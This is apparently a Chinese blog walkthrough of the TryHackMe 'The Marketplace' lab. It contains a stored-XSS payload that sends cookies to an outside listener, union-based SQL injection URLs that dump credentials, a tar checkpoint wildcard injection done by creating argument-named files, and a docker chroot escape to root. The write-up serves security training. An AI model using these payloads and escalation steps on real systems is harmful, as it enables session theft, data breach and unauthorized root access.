---
title: "THM the Marketplace"
description: "TryHackMe篇之The Marketplace"

date: 2024-10-17T15:31:23+08:00
lastmod: 2025-11-11T13:39:59+08:00

math: true
mermaid: true

categories:
  - TryHackMe
tags:
  - Linux
---
<!--more-->

> 靶机ip：10.10.113.205

# 信息收集

## nmap扫描

`nmap -min-rate 10000 -A -sV -sC -p- 10.10.113.205`

![image-20241017154202881](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017154217241-1022693500.png)

发现有22，80，32768端口开放

## 80端口

![image-20241017154309971](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017154322531-882372758.png)

先扫描目录

`gobuster dir -u http://10.10.113.205/ -w /usr/share/wordlists/dirb/common.txt`

![image-20241017154746973](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017154759524-796732244.png)

先创建一个普通用户查看一下相关路径，得到以下结果：

* `/admin` 需要登录认证才能查看
* `/signup` 注册
* `/login` 登录
* `/new` 创建一个新列表
* `/messages` 查看消息
* `/contact/michael` 联系列表作者
* `/item/1` 查看具体列表的详细信息
* `/report/1` 向管理员报告列表

# XSS钓鱼越权

测试后发现在创建新列表的时候，`Description`的值存在存储型xss

`<script>alert(1)</script>`

![image-20241017160325926](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017160338454-1233589541.png)

![image-20241017160344536](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017160357257-693709284.png)

可以利用xss得到cookie等关键信息

`<script>alert(document.cookie)</script>`

![image-20241017160607215](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017160619411-1869855713.png)

![image-20241017160512805](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017160525019-1199388518.png)

发现cookie的格式像是jwt，可以使用[在线工具](https://jwt.io/)查看一下

![image-20241017161211306](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017161223991-2004112504.png)

想尝试将cookie伪造成admin，但是失败了

我们的商品存在存储型XSS漏洞，那么我们可以在我们的商品页面作为钓鱼页面，举报自己的商品诱导管理员审核，然后得到管理员的Cookie，提取他的Token

* 首先，建立监听用于获取cookie

`python -m http.server`

![image-20241017162030691](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017162043360-56155628.png)

* 然后构造XSS钓鱼页面，当有人访问的时候获取他的cookie

```javascript
<img src=x onerror=this.src="http://10.14.90.122:8000/?1="+document.cookie>
```

`<img>` 用于加载图像。

`src=x` 设置一个无效的图像源，通常会导致加载失败。

`onerror` 当图像加载失败时触发的事件。

`this.src` 在图像加载失败时，将图像的 `src` 属性设置为一个 URL，即为我们构造的一个新的URL将当前页面的 cookies 作为查询参数添加到该 URL 中

`document.cookie` 获取当前页面的 cookies

![image-20241017162240509](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017162252922-660876351.png)

![image-20241017162324966](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017162337370-966054914.png)

这时我们会收到大量的cookie，现在举报商品

![image-20241017162440113](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017162452408-1679239075.png)

发现有几条不一样的，分析一下

![image-20241017162530429](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017162542667-494681323.png)

发现是admin的cookie，更换cookie

![image-20241017162703243](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017162715518-1364164542.png)

更换后刷新页面

![image-20241017162735330](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017162747921-460184614.png)

发现多了个`Administrator panel`，现在已经成功越权到admin了

![image-20241017162814445](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017162826902-308858830.png)

点击后获得flag

# SQL注入拿shell

![image-20241017163010291](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017163022484-117763262.png)

随便点击一个用户发现是通过get传参，`user`是参数进行查询的，判断一下是否有sql注入

![image-20241017163137167](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017163149364-625326231.png)

可以注入

```sql
http://10.10.113.205/admin?user=1 order by 4 --+
```

![image-20241017163305552](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017163317723-1348407264.png)

```sql
http://10.10.113.205/admin?user=1 order by 5 --+
```

![image-20241017163404953](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017163417336-620897975.png)

判断出字段数是4

```sql
http://10.10.113.205/admin?user=1 and 1=2 union select 1,2,3,4--+
```

![image-20241017163440726](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017163452909-662759722.png)

发现回显位置有1和2

```sql
http://10.10.113.205/admin?user=1 and 1=2 union select database(),2,3,4--+
```

![image-20241017163637823](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017163650303-2129390896.png)

找到数据库名`marketplace`

```sql
http://10.10.113.205/admin?user=1 and 1=2 union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema='marketplace'--+
```

![image-20241017163712870](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017163725041-1630260119.png)

```sql
http://10.10.113.205/admin?user=1 and 1=2 union select group_concat(column_name),2,3,4 from information_schema.columns where table_schema='marketplace' and table_name='messages'--+
```

![image-20241017163743652](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017163755877-1253692693.png)

```sql
http://10.10.113.205/admin?user=1 and 1=2 union select concat_ws(',',id,is_read,message_content,user_from,user_to),2,3,4 from marketplace.messages limit 0,1--+
```

![image-20241017163845970](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017163858140-647301558.png)

找到了`jake`用户的ssh密码`@b_ENXkGYUCAv3zJ`

ssh登录

```bash
ssh jake@10.10.113.205
```

![image-20241017164142284](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017164154918-51511059.png)

登陆成功

![image-20241017164201069](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017164213325-995265159.png)

在当前目录找到`user.txt`

# 提升至root权限

## 横向移动

经典`sudo -l`

![image-20241017164336681](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017164349253-2140029166.png)

发现我们可以不使用密码以michael的身份运行`/opt/backups/backup.sh`，查看一下

```bash
cat /opt/backups/backup.sh
```

![image-20241017164611144](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017164623416-1133329500.png)

这是一个压缩备份当前目录下的所有文件的脚本

```bash
tar cf /opt/backups/backup.tar *
```

可以用tar进行提权

```bash
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

`/dev/null` 特殊的路径，写入该文件的数据都会被丢弃，但脚本中已经定义了路径所以我们不用管

`--checkpoint=1` 在归档过程中每处理一个文件时，生成一个检查点。这个选项通常用于长时间运行的 tar 操作。

`--checkpoint-action=exec=/bin/sh` 在每个检查点触发时执行指定的命令。这里指定的命令是 `/bin/sh`，即启动一个新的 shell。

只要能够让`--checkpoint=1`和`--checkpoint-action=exec=sh`运行起来就行了，那么我们只用创建两个名为`--checkpoint=1`和`--checkpoint-action=exec=sh`的文件就行了

```bash
echo "/bin/bash" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
chmod 777 backup.tar
sudo -u michael /opt/backups/backup.sh
```

![image-20241017183604622](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017183620069-1667799123.png)

需要注意的是要将`backup.tar`权限设置成能允许其他用户可以访问的权限

现在就移动到`michael`权限

## 提权至root

`id`看下权限先

![image-20241017183913322](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017183927283-989168472.png)

发现有个docker权限

利用docker提权

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

![image-20241017184029556](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017184042987-2077176883.png)

提权成功

![image-20241017184104249](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241017184117724-885437577.png)

在`/root`下找到`root.txt`

